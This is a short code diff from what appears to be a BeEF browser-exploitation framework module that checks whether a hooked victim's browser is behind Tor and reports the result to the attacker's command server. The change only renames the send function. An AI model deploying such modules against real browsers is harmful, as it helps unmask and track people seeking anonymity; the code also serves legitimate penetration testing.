@@ -23,11 +23,11 @@ beef.execute(function() {
 	setTimeout(function() {
 		var img = document.getElementById('torimg');	
 		if (img.getAttribute("attr") == "error") {
-			beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result=Browser is not behind Tor');
+			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser is not behind Tor');
 		} else if (img.getAttribute("attr") == "load") {
-			beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result=Browser is behind Tor');
+			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser is behind Tor');
 		} else if (img.getAttribute("attr") == "start") {
-			beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'result=Browser timed out. Cannot determine if browser is behind Tor');
+			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser timed out. Cannot determine if browser is behind Tor');
 		};
 		document.body.removeChild(img);
 		}, <%= @timeout %>);
